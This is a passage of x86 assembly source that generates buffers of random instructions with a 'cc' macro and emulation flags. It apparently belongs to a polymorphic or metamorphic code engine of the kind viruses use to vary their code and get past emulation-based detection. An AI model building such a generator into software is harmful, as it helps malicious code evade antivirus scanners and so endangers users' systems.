; NOT USED: 0x9A-0x9F: call, wait, pushfd, popfd, sahf, lahf
; ...
; 0xF8 ... clc                   0xF8                 SingleByteCommand
; 0xF9 ... stc                   0xF9                 SingleByteCommand
; Rest of 0xA0 - 0xFF ... [maybe in next versions] - however, the instruction set above should
;                                            do its job quite good for the moment


; ----
		cc rP,	     xor,     ebp, ebp		      ; counter
		cc rCP,      xor,     ecx, ecx
		cc rP,	     mov,     byte[CGPushPop], cl

    CreateMoreRandomCode:
		cc rBP,      mov,     ebx, 17
		cc rBCP,     xor,     ecx, ecx

		cc rNoEmul,  call,    CreateSpecialRndNumber
		cc rAP,      mov,     al, dl	  ; AL=Main random number

	   SingleByteCommand:
		cc rAPF,     cmp,     al, 0
		cc rNoEmul,  jne,     SingleByteCommandEnd

		cc rBP,      mov,     ebx, 19
		cc rBCP,     xor,     ecx, ecx
		cc rNoEmul,  call,    CreateSpecialRndNumber

		cc rDPF,     cmp,     dl, 9
		cc rNoEmul,  ja,      SingleByteCommandSpecial

		cc rDPF,     cmp,     dl, 4
		cc rNoEmul,  jne,     SingleByteCommandFinAdd
		cc rDP,      xor,     dl, dl		      ; 0x94=xchg eax, esp
		SingleByteCommandFinAdd:
		cc rDP,      add,     dl, 0x90		      ; dl=0x90 ... 0x99
		cc rNoEmul,  jmp,     SingleByteCommand2Mem

		SingleByteCommandSpecial:
		cc rDP,      mov,     dh, 0x27			; DAA
		cc rDPF,     cmp,     dl, 10
		cc rNoEmul,  je,      SingleByteCommand2MemBef
		cc rDP,      mov,     dh, 0x2F			; DAS
		cc rDPF,     cmp,     dl, 11
		cc rNoEmul,  je,      SingleByteCommand2MemBef
		cc rDP,      mov,     dh, 0x37			; AAA
		cc rDPF,     cmp,     dl, 12
		cc rNoEmul,  je,      SingleByteCommand2MemBef
		cc rDP,      mov,     dh, 0x3F			; AAS
		cc rDPF,     cmp,     dl, 13
		cc rNoEmul,  je,      SingleByteCommand2MemBef
		cc rDP,      mov,     dh, 0xF8			; CLC
		cc rDPF,     cmp,     dl, 14
		cc rNoEmul,  je,      SingleByteCommand2MemBef
		cc rDP,      mov,     dh, 0xF9			; STC
		cc rDPF,     cmp,     dl, 15
		cc rNoEmul,  je,      SingleByteCommand2MemBef

		cc rDP,      mov,     dh, 0x90	      ; NOP

		SingleByteCommand2MemBef:
		cc rDP,      mov,     dl, dh
		SingleByteCommand2Mem:
		cc rP,	     mov,     byte[RandomCode+ebp], dl
		cc rP,	     add,     ebp, 0x1
	   cc rNoEmul,	jmp,  EndCRCCycle
	   SingleByteCommandEnd:


	   OPReg8Reg8:
		cc rAPF,     cmp,     al, 1
		cc rNoEmul,  jne,     OPReg8Reg8End

		cc rPF,      cmp,     ebp, (RandomCodeBufferSize-2)
		cc rNoEmul,  jg,      EndCRCCycle

		cc rBP,      mov,     ebx, 21
		cc rBCP,     xor,     ecx, ecx
		cc rNoEmul,  call,    CreateSpecialRndNumber

		cc rDP,      mov,     byte[RandomCode+ebp], 0x00   ; add Reg8, Reg8
		cc rDPF,     cmp,     dl, 0
		cc rNoEmul,  je,      OPReg8Reg8Cont

		cc rDP,      mov,     byte[RandomCode+ebp], 0x02   ; add Reg8, Reg8
		cc rDPF,     cmp,     dl, 1
		cc rNoEmul,  je,      OPReg8Reg8Cont

		cc rDP,      mov,     byte[RandomCode+ebp], 0x08   ; or Reg8, Reg8
		cc rDPF,     cmp,     dl, 2
		cc rNoEmul,  je,      OPReg8Reg8Cont

		cc rDP,      mov,     byte[RandomCode+ebp], 0x0A   ; or Reg8, Reg8
		cc rDPF,     cmp,     dl, 3
		cc rNoEmul,  je,      OPReg8Reg8Cont

		cc rDP,      mov,     byte[RandomCode+ebp], 0x10   ; adc Reg8, Reg8
		cc rDPF,     cmp,     dl, 4
		cc rNoEmul,  je,      OPReg8Reg8Cont

		cc rDP,      mov,     byte[RandomCode+ebp], 0x12   ; adc Reg8, Reg8
		cc rDPF,     cmp,     dl, 5
		cc rNoEmul,  je,      OPReg8Reg8Cont

		cc rDP,      mov,     byte[RandomCode+ebp], 0x18   ; sbb Reg8, Reg8
		cc rDPF,     cmp,     dl, 6
		cc rNoEmul,  je,      OPReg8Reg8Cont

		cc rDP,      mov,     byte[RandomCode+ebp], 0x1A   ; sbb Reg8, Reg8
		cc rDPF,     cmp,     dl, 7
		cc rNoEmul,  je,      OPReg8Reg8Cont

		cc rDP,      mov,     byte[RandomCode+ebp], 0x20   ; and Reg8, Reg8
		cc rDPF,     cmp,     dl, 8
		cc rNoEmul,  je,      OPReg8Reg8Cont

		cc rDP,      mov,     byte[RandomCode+ebp], 0x22   ; and Reg8, Reg8
		cc rDPF,     cmp,     dl, 9
		cc rNoEmul,  je,      OPReg8Reg8Cont

		cc rDP,      mov,     byte[RandomCode+ebp], 0x28   ; sub Reg8, Reg8
		cc rDPF,     cmp,     dl, 10
		cc rNoEmul,  je,      OPReg8Reg8Cont

		cc rDP,      mov,     byte[RandomCode+ebp], 0x2A   ; sub Reg8, Reg8
		cc rDPF,     cmp,     dl, 11
		cc rNoEmul,  je,      OPReg8Reg8Cont

		cc rDP,      mov,     byte[RandomCode+ebp], 0x30   ; xor Reg8, Reg8
		cc rDPF,     cmp,     dl, 12
		cc rNoEmul,  je,      OPReg8Reg8Cont

		cc rDP,      mov,     byte[RandomCode+ebp], 0x32   ; xor Reg8, Reg8
		cc rDPF,     cmp,     dl, 13
		cc rNoEmul,  je,      OPReg8Reg8Cont

		cc rDP,      mov,     byte[RandomCode+ebp], 0x38   ; cmp Reg8, Reg8
		cc rDPF,     cmp,     dl, 14
		cc rNoEmul,  je,      OPReg8Reg8Cont

		cc rDP,      mov,     byte[RandomCode+ebp], 0x3A   ; cmp Reg8, Reg8
		cc rDPF,     cmp,     dl, 15
		cc rNoEmul,  je,      OPReg8Reg8Cont

		cc rDP,      mov,     byte[RandomCode+ebp], 0x86   ; xchg Reg8, Reg8
		cc rDPF,     cmp,     dl, 16
		cc rNoEmul,  je,      OPReg8Reg8Cont

		cc rDP,      mov,     byte[RandomCode+ebp], 0x88   ; mov Reg8, Reg8
		cc rDPF,     cmp,     dl, 17
		cc rNoEmul,  je,      OPReg8Reg8Cont

		cc rDP,      mov,     byte[RandomCode+ebp], 0x8A   ; mov Reg8, Reg8
		cc rDPF,     cmp,     dl, 18
		cc rNoEmul,  je,      OPReg8Reg8Cont

		cc rNoEmul,  jmp,  OPReg8Reg8End

		OPReg8Reg8Cont:
		cc rBP,      mov,     ebx, (0xFF-0xC0)
		cc rBCP,     mov,     ecx, 0xC0
		cc rNoEmul,  call,    CreateSpecialRndNumber
		cc rDP,      mov,     byte[RandomCode+ebp+1], dl
		cc rP,	     add,     ebp, 0x2
	   cc rNoEmul,	     jmp,  EndCRCCycle
	   OPReg8Reg8End:


	   OPReg32Reg32:
		cc rAPF,     cmp,     al, 2
		cc rNoEmul,  jne,     OPReg32Reg32End

		cc rPF,      cmp,     ebp, (RandomCodeBufferSize-2)
		cc rNoEmul,  jg,      EndCRCCycle

		cc rBP,      mov,     ebx, 21
		cc rBCP,     xor,     ecx, ecx
		cc rNoEmul,  call,    CreateSpecialRndNumber

		cc rDP,       mov,     byte[RandomCode+ebp], 0x01   ; add Reg32, Reg32
		cc rDPF,      cmp,     dl, 0
		cc rNoEmul,   je,      OPReg32Reg32Cont

		cc rDP,       mov,     byte[RandomCode+ebp], 0x03   ; add Reg32, Reg32
		cc rDPF,      cmp,     dl, 1
		cc rNoEmul,   je,      OPReg32Reg32Cont

		cc rDP,       mov,     byte[RandomCode+ebp], 0x09   ; or Reg32, Reg32
		cc rDPF,      cmp,     dl, 2
		cc rNoEmul,   je,      OPReg32Reg32Cont

		cc rDP,       mov,     byte[RandomCode+ebp], 0x0B   ; or Reg32, Reg32
		cc rDPF,      cmp,     dl, 3
		cc rNoEmul,   je,      OPReg32Reg32Cont

		cc rDP,       mov,     byte[RandomCode+ebp], 0x11   ; adc Reg32, Reg32
		cc rDPF,      cmp,     dl, 4
		cc rNoEmul,   je,      OPReg32Reg32Cont

		cc rDP,       mov,     byte[RandomCode+ebp], 0x13   ; adc Reg32, Reg32
		cc rDPF,      cmp,     dl, 5
		cc rNoEmul,   je,      OPReg32Reg32Cont

		cc rDP,       mov,     byte[RandomCode+ebp], 0x19   ; sbb Reg32, Reg32
		cc rDPF,      cmp,     dl, 6
		cc rNoEmul,   je,      OPReg32Reg32Cont

		cc rDP,       mov,     byte[RandomCode+ebp], 0x1B   ; sbb Reg32, Reg32
		cc rDPF,      cmp,     dl, 7
		cc rNoEmul,   je,      OPReg32Reg32Cont

		cc rDP,       mov,     byte[RandomCode+ebp], 0x21   ; and Reg32, Reg32
		cc rDPF,      cmp,     dl, 8
		cc rNoEmul,   je,      OPReg32Reg32Cont

		cc rDP,       mov,     byte[RandomCode+ebp], 0x23   ; and Reg32, Reg32
		cc rDPF,      cmp,     dl, 9
		cc rNoEmul,   je,      OPReg32Reg32Cont

		cc rDP,       mov,     byte[RandomCode+ebp], 0x29   ; sub Reg32, Reg32
		cc rDPF,      cmp,     dl, 10
		cc rNoEmul,   je,      OPReg32Reg32Cont

		cc rDP,       mov,     byte[RandomCode+ebp], 0x2B   ; sub Reg32, Reg32
		cc rDPF,      cmp,     dl, 11
		cc rNoEmul,   je,      OPReg32Reg32Cont

		cc rDP,       mov,     byte[RandomCode+ebp], 0x31   ; xor Reg32, Reg32
		cc rDPF,      cmp,     dl, 12
		cc rNoEmul,   je,      OPReg32Reg32Cont

		cc rDP,       mov,     byte[RandomCode+ebp], 0x33   ; xor Reg32, Reg32
		cc rDPF,      cmp,     dl, 13
		cc rNoEmul,   je,      OPReg32Reg32Cont

		cc rDP,       mov,     byte[RandomCode+ebp], 0x39   ; cmp Reg32, Reg32
		cc rDPF,      cmp,     dl, 14
		cc rNoEmul,   je,      OPReg32Reg32Cont

		cc rDP,       mov,     byte[RandomCode+ebp], 0x3B   ; cmp Reg32, Reg32
		cc rDPF,      cmp,     dl, 15
		cc rNoEmul,   je,      OPReg32Reg32Cont

		cc rDP,       mov,     byte[RandomCode+ebp], 0x89   ; mov Reg32, Reg32
		cc rDPF,      cmp,     dl, 16
		cc rNoEmul,   je,      OPReg32Reg32Cont

		cc rDP,       mov,     byte[RandomCode+ebp], 0x8B   ; mov Reg32, Reg32
		cc rDPF,      cmp,     dl, 17
		cc rNoEmul,   je,      OPReg32Reg32Cont

		cc rDP,       mov,     byte[RandomCode+ebp], 0x87   ; xchg Reg32, Reg32
		cc rDPF,      cmp,     dl, 18
		cc rNoEmul,   je,      OPReg32Reg32Cont
		cc rNoEmul,   jmp,     OPReg32Reg32End

		OPReg32Reg32Cont:
		cc rDP,       push,    edx		   ; Save dl
		cc rBP,       mov,     ebx, (0xFF-0xC0)
		cc rBCP,      mov,     ecx, 0xC0
		cc rNoEmul,   call,    CreateSpecialRndNumber
		cc rP,	      mov,     byte[RandomCode+ebp+1], dl
		cc rADP,      pop,     eax
		cc rDPF,      and,     al, 0001b
		cc rNoEmul,   jz,      OPReg32Reg32CheckESP0

		cc rDP,       mov,     byte[RandomCode+ebp+1], dl
		cc rDP,       and,     dl, 111000b
		cc rDPF,      cmp,     dl, 100000b
		cc rNoEmul,   je,      EndCRCCycle		      ; OP esp, ... but source and destination reversed
		cc rP,	      add,     ebp, 0x2
	      cc rNoEmul, jmp,	EndCRCCycle

		OPReg32Reg32CheckESP0:
		cc rDP,       mov,     dh, byte[RandomCode+ebp]
		cc rDPF,      cmp,     dh, 0x87
		cc rNoEmul,   jne,     OPReg32Reg32CheckESP1

		cc rDPF,      cmp,     dl, 0xE0
		cc rNoEmul,   jb,      OPReg32Reg32CheckESP1
		cc rDPF,      cmp,     dl, 0xE8
	      cc rNoEmul, jb,	   EndCRCCycle

		OPReg32Reg32CheckESP1:
		cc rDP,       and,     dl, 111b
		cc rDPF,      cmp,     dl, 100b
		cc rNoEmul,   je,      EndCRCCycle		      ; OP esp, ...

		cc rP,	      add,     ebp, 0x2
	   cc rNoEmul, jmp,  EndCRCCycle
	   OPReg32Reg32End:


	   OPAlImm8:
		cc rAPF,      cmp,     al, 3
		cc rNoEmul,   jne,     OPAlImm8End

		cc rPF,       cmp,     ebp, (RandomCodeBufferSize-2)
		cc rNoEmul,   jg,      EndCRCCycle

		cc rBP,       mov,     ebx, 9
		cc rBCP,      xor,     ecx, ecx
		cc rNoEmul,   call,    CreateSpecialRndNumber

		cc rDP,       mov,     byte[RandomCode+ebp], 0x04   ; add al, Imm8
		cc rDPF,      cmp,     dl, 0
		cc rNoEmul,   je,      OPAlImm8Cont

		cc rDP,       mov,     byte[RandomCode+ebp], 0x0C   ; or al, Imm8
		cc rDPF,      cmp,     dl, 1
		cc rNoEmul,   je,      OPAlImm8Cont

		cc rDP,       mov,     byte[RandomCode+ebp], 0x14   ; adc al, Imm8
		cc rDPF,      cmp,     dl, 2
		cc rNoEmul,   je,      OPAlImm8Cont

		cc rDP,       mov,     byte[RandomCode+ebp], 0x1C   ; sbb al, Imm8
		cc rDPF,      cmp,     dl, 3
		cc rNoEmul,   je,      OPAlImm8Cont

		cc rDP,       mov,     byte[RandomCode+ebp], 0x24   ; and al, Imm8
		cc rDPF,      cmp,     dl, 4
		cc rNoEmul,   je,      OPAlImm8Cont

		cc rDP,       mov,     byte[RandomCode+ebp], 0x2C   ; sub al, Imm8
		cc rDPF,      cmp,     dl, 5
		cc rNoEmul,   je,      OPAlImm8Cont

		cc rDP,       mov,     byte[RandomCode+ebp], 0x34   ; xor al, Imm8
		cc rDPF,      cmp,     dl, 6
		cc rNoEmul,   je,      OPAlImm8Cont

		cc rDP,       mov,     byte[RandomCode+ebp], 0x3C   ; cmp al, Imm8
		cc rDPF,      cmp,     dl, 7
		cc rNoEmul,   je,      OPAlImm8Cont
		cc rNoEmul,   jmp,  OPAlImm8End

		OPAlImm8Cont:
		cc rNoEmul,   call,    GetRandomNumber
		cc rP,	      mov,     byte[RandomCode+ebp+1], dl
		cc rP,	      add,     ebp, 0x2
	   cc rNoEmul,	  jmp,	EndCRCCycle
	   OPAlImm8End:



	   OPEaxImm32:
		cc rAPF,      cmp,	al, 4
		cc rNoEmul,   jne,	OPEaxImm32End

		cc rPF,       cmp,	ebp, (RandomCodeBufferSize-5)
		cc rNoEmul,   jg,	EndCRCCycle

		cc rBP,       mov,	ebx, 9
		cc rBCP,      xor,	ecx, ecx
		cc rNoEmul,   call,	CreateSpecialRndNumber

		cc rDP,        mov,	byte[RandomCode+ebp], 0x05   ; add eax, Imm32
		cc rDPF,       cmp,	dl, 0
		cc rNoEmul,    je,	OPEaxImm32Cont

		cc rDP,        mov,	byte[RandomCode+ebp], 0x0D   ; or eax, Imm32
		cc rDPF,       cmp,	dl, 1
		cc rNoEmul,    je,	OPEaxImm32Cont

		cc rDP,        mov,	byte[RandomCode+ebp], 0x15   ; adc eax, Imm32
		cc rDPF,       cmp,	dl, 2
		cc rNoEmul,    je,	OPEaxImm32Cont

		cc rDP,        mov,	byte[RandomCode+ebp], 0x1D   ; sbb eax, Imm32
		cc rDPF,       cmp,	dl, 3
		cc rNoEmul,    je,	OPEaxImm32Cont

		cc rDP,        mov,	byte[RandomCode+ebp], 0x25   ; and eax, Imm32
		cc rDPF,       cmp,	dl, 4
		cc rNoEmul,    je,	OPEaxImm32Cont

		cc rDP,        mov,	byte[RandomCode+ebp], 0x2D   ; sub eax, Imm32
		cc rDPF,       cmp,	dl, 5
		cc rNoEmul,    je,	OPEaxImm32Cont

		cc rDP,        mov,	byte[RandomCode+ebp], 0x35   ; xor eax, Imm32
		cc rDPF,       cmp,	dl, 6
		cc rNoEmul,    je,	OPEaxImm32Cont

		cc rDP,        mov,	byte[RandomCode+ebp], 0x3D   ; cmp eax, Imm32
		cc rDPF,       cmp,	dl, 7
		cc rNoEmul,    je,	OPEaxImm32Cont
		cc rNoEmul,    jmp,	OPEaxImm32End

		OPEaxImm32Cont:
		cc rNoEmul,    call,   GetRandomNumber
		cc rDP,        mov,    edx, dword[RandomNumber]
		cc rP,	       mov,    dword[RandomCode+ebp+1], edx
		cc rP,	       add,    ebp, 0x5
	   cc rNoEmul,	jmp,  EndCRCCycle
	   OPEaxImm32End:




	   VariousReg8Imm8:			    ; add | or | adc | sbb | and | sub | xor | cmp Reg8, Imm8
		cc rAPF,     cmp,     al, 5
		cc rNoEmul,  jne,     VariousReg8Imm8End
		cc rPF,      cmp,     ebp, (RandomCodeBufferSize-3)
		cc rNoEmul,  jg,      EndCRCCycle

		cc rBP,      mov,     ebx, 3
		cc rBCP,     xor,     ecx, ecx
		cc rNoEmul,  call,    CreateSpecialRndNumber

		cc rDP,      mov,     byte[RandomCode+ebp], 0x80
		cc rDPF,     cmp,     dl, 0
		cc rNoEmul,  je,      VariousReg8Imm8Cont

		cc rDP,      mov,     byte[RandomCode+ebp], 0x82
		cc rDPF,     cmp,     dl, 1
		cc rNoEmul,  je,      VariousReg8Imm8Cont
		cc rNoEmul,  jmp,     EndCRCCycle

		VariousReg8Imm8Cont:
		cc rBP,      mov,     ebx, (0xFF-0xC0)
		cc rBCP,     mov,     ecx, 0xC0
		cc rNoEmul,  call,    CreateSpecialRndNumber
		cc rP,	     mov,     byte[RandomCode+ebp+1], dl
		cc rNoEmul,  call,    GetRandomNumber
		cc rDP,      mov,     dl, byte[RandomNumber]
		cc rP,	     mov,     byte[RandomCode+ebp+2], dl
		cc rP,	     add,     ebp, 0x3
	   cc rNoEmul,	jmp,  EndCRCCycle
	   VariousReg8Imm8End:


	   VariousReg32Imm32:			      ; add | or | adc | sbb | and | sub | xor | cmp Reg32, Imm32
		cc rAPF,     cmp,     al, 6
		cc rNoEmul,  jne,     VariousReg32ImmEnd

		cc rBP,      mov,     ebx, 3
		cc rBCP,     xor,     ecx, ecx
		cc rNoEmul,  call,    CreateSpecialRndNumber

		cc rDPS,     mov,     esi, 6
		cc rDPS,     mov,     byte[RandomCode+ebp], 0x81
		cc rDPSF,    cmp,     dl, 0
		cc rNoEmul,  je,      VariousReg32Imm32Cont

		cc rDPS,     mov,     esi, 3
		cc rDPS,     mov,     byte[RandomCode+ebp], 0x83
		cc rDPSF,    cmp,     dl, 1
		cc rNoEmul,  je,      VariousReg32Imm32Cont
		cc rNoEmul,  jmp,     VariousReg32ImmEnd

		VariousReg32Imm32Cont:
		cc rBPS,     mov,     ebx, (0xFF-0xC0)
		cc rBCPS,    mov,     ecx, 0xC0
		cc rNoEmul,  call,    CreateSpecialRndNumber
		cc rDPS,     mov,     byte[RandomCode+ebp+1], dl
		cc rDPS,     mov,     byte[RandomCode+ebp+1], dl
		cc rDPS,     and,     dl, 111b
		cc rDPSF,    cmp,     dl, 100b
		cc rNoEmul,  je,      EndCRCCycle		     ; OP esp, ...
		cc rNoEmul,  call,    GetRandomNumber
		cc rDPS,     mov,     edx, dword[RandomNumber]
		cc rPS,      mov,     dword[RandomCode+ebp+2], edx
		cc rCPS,     mov,     ecx, RandomCodeBufferSize
		cc rCPS,     sub,     ecx, esi
		cc rDPSF,    cmp,     ebp, ecx
		cc rNoEmul,  jg,      EndCRCCycle
		cc rP,	     add,     ebp, esi
	   cc rNoEmul, jmp,  EndCRCCycle
	   VariousReg32ImmEnd:




	   OPMem8Reg8:			      ; OP Mem8, Reg8  | OP Reg8, Mem8
		cc rAPF,     cmp,     al, 7
		cc rNoEmul,  jne,     OPMem8Reg8End

		cc rBP,      mov,     ebx, 19
		cc rBCP,     xor,     ecx, ecx
		cc rNoEmul,  call,    CreateSpecialRndNumber

		cc rDP,      mov,     byte[RandomCode+ebp], 0x00   ; add Mem8, Reg8
		cc rDPF,     cmp,     dl, 0
		cc rNoEmul,  je,      OPMem8Reg8Cont

		cc rDP,      mov,     byte[RandomCode+ebp], 0x02   ; add Reg8, Mem8
		cc rBCPF,    cmp,     dl, 1
		cc rNoEmul,  je,      OPMem8Reg8Cont

		cc rDP,      mov,     byte[RandomCode+ebp], 0x08   ; or Mem8, Reg8
		cc rBCPF,    cmp,     dl, 2
		cc rNoEmul,  je,      OPMem8Reg8Cont

		cc rDP,      mov,     byte[RandomCode+ebp], 0x0A   ; or Reg8, Mem8
		cc rBCPF,    cmp,     dl, 3
		cc rNoEmul,  je,      OPMem8Reg8Cont

		cc rDP,      mov,     byte[RandomCode+ebp], 0x10   ; adc Mem8, Reg8
		cc rBCPF,    cmp,     dl, 4
		cc rNoEmul,  je,      OPMem8Reg8Cont

		cc rDP,      mov,     byte[RandomCode+ebp], 0x12   ; adc Reg8, Mem8
		cc rBCPF,    cmp,     dl, 5
		cc rNoEmul,  je,      OPMem8Reg8Cont

		cc rDP,      mov,     byte[RandomCode+ebp], 0x18   ; sbb Mem8, Reg8
		cc rBCPF,    cmp,     dl, 6
		cc rNoEmul,  je,      OPMem8Reg8Cont

		cc rDP,      mov,     byte[RandomCode+ebp], 0x1A   ; sbb Reg8, Mem8
		cc rBCPF,    cmp,     dl, 7
		cc rNoEmul,  je,      OPMem8Reg8Cont

		cc rDP,      mov,     byte[RandomCode+ebp], 0x20   ; and Mem8, Reg8
		cc rBCPF,    cmp,     dl, 8
		cc rNoEmul,  je,      OPMem8Reg8Cont

		cc rDP,      mov,     byte[RandomCode+ebp], 0x22   ; and Reg8, Mem8
		cc rBCPF,    cmp,     dl, 9
		cc rNoEmul,  je,      OPMem8Reg8Cont

		cc rDP,      mov,     byte[RandomCode+ebp], 0x28   ; sub Mem8, Reg8
		cc rBCPF,    cmp,     dl, 10
		cc rNoEmul,  je,      OPMem8Reg8Cont

		cc rDP,      mov,     byte[RandomCode+ebp], 0x2A   ; sub Reg8, Mem8
		cc rBCPF,    cmp,     dl, 11
		cc rNoEmul,  je,      OPMem8Reg8Cont

		cc rDP,      mov,     byte[RandomCode+ebp], 0x30   ; xor Mem8, Reg8
		cc rBCPF,    cmp,     dl, 12
		cc rNoEmul,  je,      OPMem8Reg8Cont

		cc rDP,      mov,     byte[RandomCode+ebp], 0x32   ; xor Reg8, Mem8
		cc rBCPF,    cmp,     dl, 13
		cc rNoEmul,  je,      OPMem8Reg8Cont

		cc rDP,      mov,     byte[RandomCode+ebp], 0x38   ; cmp, Mem8, Reg8
		cc rBCPF,    cmp,     dl, 14
		cc rNoEmul,  je,      OPMem8Reg8Cont

		cc rDP,      mov,     byte[RandomCode+ebp], 0x3A   ; cmp, Reg8, Mem8
		cc rBCPF,    cmp,     dl, 15
		cc rNoEmul,  je,      OPMem8Reg8Cont

		cc rDP,      mov,     byte[RandomCode+ebp], 0x86   ; xchg Mem8, Reg8
		cc rBCPF,    cmp,     dl, 16
		cc rNoEmul,  je,      OPMem8Reg8Cont

		cc rDP,      mov,     byte[RandomCode+ebp], 0x88   ; mov Mem8, Reg8
		cc rBCPF,    cmp,     dl, 17
		cc rNoEmul,  je,      OPMem8Reg8Cont

		cc rDP,      mov,     byte[RandomCode+ebp], 0x8A   ; mov Reg8, Mem8
		cc rBCPF,    cmp,     dl, 18
		cc rNoEmul,  je,      OPMem8Reg8Cont

		cc rNoEmul,  jmp,     EndCRCCycle

	     OPMem8Reg8Cont:
		cc rBP,      mov,     ebx, 0xBF
		cc rBCP,     mov,     ecx, 0x0
		cc rNoEmul,  call,    CreateSpecialRndNumber
		cc rP,	     mov,     byte[RandomCode+ebp+1], dl

		cc rNoEmul,  call,    GetRandomNumber

		cc rDP,      and,     dl, 11000111b
		cc rDPF,     cmp,     dl, 00000100b
		cc rNoEmul,  je,      OPMem8Reg8_3byte
		cc rDPF,     cmp,     dl, 00000101b
		cc rNoEmul,  je,      OPMem8Reg8_6byte
		cc rDPF,     cmp,     dl, 0x40
		cc rNoEmul,  jb,      OPMem8Reg8_2byte
		cc rDPF,     cmp,     dl, 01000100b
		cc rNoEmul,  je,      OPMem8Reg8_4byte
		cc rDPF,     cmp,     dl, 0x80
		cc rNoEmul,  jb,      OPMem8Reg8_3byte
		cc rDPF,     cmp,     dl, 10000100b
		cc rNoEmul,  je,      OPMem8Reg8_7byte
		cc rNoEmul,  jmp,     OPMem8Reg8_6byte

	     OPMem8Reg8_3byte:
		cc rPF,      cmp,     ebp, (RandomCodeBufferSize-3)
		cc rNoEmul,  jg,      EndCRCCycle
		cc rDP,      mov,     edx, dword[RandomNumber]
		cc rP,	     mov,     byte[RandomCode+ebp+2], dl
		cc rP,	     add,     ebp, 0x1
		cc rNoEmul,  jmp,     EndOPMem8Reg8

	     OPMem8Reg8_4byte:
		cc rPF,      cmp,     ebp, (RandomCodeBufferSize-4)
		cc rNoEmul,  jg,      EndCRCCycle
		cc rDP,      mov,     edx, dword[RandomNumber]
		cc rP,	     mov,     word[RandomCode+ebp+2], dx
		cc rP,	     add,     ebp, 0x2
		cc rNoEmul,  jmp,     EndOPMem8Reg8

	     OPMem8Reg8_6byte:
		cc rPF,      cmp,     ebp, (RandomCodeBufferSize-6)
		cc rNoEmul,  jg,      EndCRCCycle
		cc rDP,      mov,     edx, dword[RandomNumber]
		cc rP,	     mov,     dword[RandomCode+ebp+2], edx
		cc rP,	     add,     ebp, 0x4
		cc rNoEmul,  jmp,     EndOPMem8Reg8

	     OPMem8Reg8_7byte:
		cc rPF,      cmp,     ebp, (RandomCodeBufferSize-7)
		cc rNoEmul,  jg,      EndCRCCycle
		cc rDP,      mov,     edx, dword[RandomNumber]
		cc rP,	     mov,     dword[RandomCode+ebp+2], edx
		cc rNoEmul,  call,    GetRandomNumber
		cc rDP,      mov,     dl, byte[RandomNumber]
		cc rP,	     mov,     byte[RandomCode+ebp+6], dl
		cc rP,	     add,     ebp, 0x5
		cc rNoEmul,  jmp,     EndOPMem8Reg8

	     OPMem8Reg8_2byte:
	     EndOPMem8Reg8:
		cc rP,	     add,     ebp, 0x2
	   cc rNoEmul,	jmp,  EndCRCCycle
	   OPMem8Reg8End:


	   OPMem32Reg32:			; OP Mem32, Reg32  | OP Reg32, Mem32
		cc rAPF,     cmp,     al, 8
		cc rNoEmul,  jne,     OPMem32Reg32End

		cc rBP,      mov,     ebx, 19
		cc rBCP,     xor,     ecx, ecx
		cc rNoEmul,  call,    CreateSpecialRndNumber

		cc rDP,      mov,     byte[RandomCode+ebp], 0x01   ; add Mem32, Reg32
		cc rDPF,     cmp,     dl, 0
		cc rNoEmul,  je,      OPMem32Reg32Cont

		cc rDP,      mov,     byte[RandomCode+ebp], 0x03   ; add Reg32, Mem32
		cc rDPF,     cmp,     dl, 1
		cc rNoEmul,  je,      OPMem32Reg32ESPCheck

		cc rDP,      mov,     byte[RandomCode+ebp], 0x09   ; or Mem32, Reg32
		cc rDPF,     cmp,     dl, 2
		cc rNoEmul,  je,      OPMem32Reg32Cont

		cc rDP,      mov,     byte[RandomCode+ebp], 0x0B   ; or Reg32, Mem32
		cc rDPF,     cmp,     dl, 3
		cc rNoEmul,  je,      OPMem32Reg32ESPCheck

		cc rDP,      mov,     byte[RandomCode+ebp], 0x11   ; adc Mem32, Reg32
		cc rDPF,     cmp,     dl, 4
		cc rNoEmul,  je,      OPMem32Reg32Cont

		cc rDP,      mov,     byte[RandomCode+ebp], 0x13   ; adc Reg32, Mem32
		cc rDPF,     cmp,     dl, 5
		cc rNoEmul,  je,      OPMem32Reg32ESPCheck

		cc rDP,      mov,     byte[RandomCode+ebp], 0x19   ; sbb Mem32, Reg32
		cc rDPF,     cmp,     dl, 6
		cc rNoEmul,  je,      OPMem32Reg32Cont

		cc rDP,      mov,     byte[RandomCode+ebp], 0x1B   ; sbb Reg32, Mem32
		cc rDPF,     cmp,     dl, 7
		cc rNoEmul,  je,      OPMem32Reg32ESPCheck

		cc rDP,      mov,     byte[RandomCode+ebp], 0x21   ; and Mem32, Reg32
		cc rDPF,     cmp,     dl, 8
		cc rNoEmul,  je,      OPMem32Reg32Cont

		cc rDP,      mov,     byte[RandomCode+ebp], 0x23   ; and Reg32, Mem32
		cc rDPF,     cmp,     dl, 9
		cc rNoEmul,  je,      OPMem32Reg32ESPCheck

		cc rDP,      mov,     byte[RandomCode+ebp], 0x29   ; sub Mem32, Reg32
		cc rDPF,     cmp,     dl, 10
		cc rNoEmul,  je,      OPMem32Reg32Cont

		cc rDP,      mov,     byte[RandomCode+ebp], 0x2B   ; sub Reg32, Mem32
		cc rDPF,     cmp,     dl, 11
		cc rNoEmul,  je,      OPMem32Reg32ESPCheck

		cc rDP,      mov,     byte[RandomCode+ebp], 0x31   ; xor Mem32, Reg32
		cc rDPF,     cmp,     dl, 12
		cc rNoEmul,  je,      OPMem32Reg32Cont

		cc rDP,      mov,     byte[RandomCode+ebp], 0x33   ; xor Reg32, Mem32
		cc rDPF,     cmp,     dl, 13
		cc rNoEmul,  je,      OPMem32Reg32ESPCheck

		cc rDP,      mov,     byte[RandomCode+ebp], 0x39   ; cmp, Mem32, Reg32
		cc rDPF,     cmp,     dl, 14
		cc rNoEmul,  je,      OPMem32Reg32Cont

		cc rDP,      mov,     byte[RandomCode+ebp], 0x3A   ; cmp, Reg32, Mem32
		cc rDPF,     cmp,     dl, 15
		cc rNoEmul,  je,      OPMem32Reg32ESPCheck

		cc rDP,      mov,     byte[RandomCode+ebp], 0x87   ; xchg Mem32, Reg32
		cc rDPF,     cmp,     dl, 16
		cc rNoEmul,  je,      OPMem32Reg32ESPCheck

		cc rDP,      mov,     byte[RandomCode+ebp], 0x89   ; mov, Mem32, Reg32
		cc rDPF,     cmp,     dl, 17
		cc rNoEmul,  je,      OPMem32Reg32Cont

		cc rDP,      mov,     byte[RandomCode+ebp], 0x8B   ; mov Reg32, Mem32
		cc rDPF,     cmp,     dl, 18
		cc rNoEmul,  je,      OPMem32Reg32ESPCheck

		cc rNoEmul,  jmp,     EndCRCCycle

	     OPMem32Reg32ESPCheck:
		cc rBDP,     mov,     ebx, 0xBF
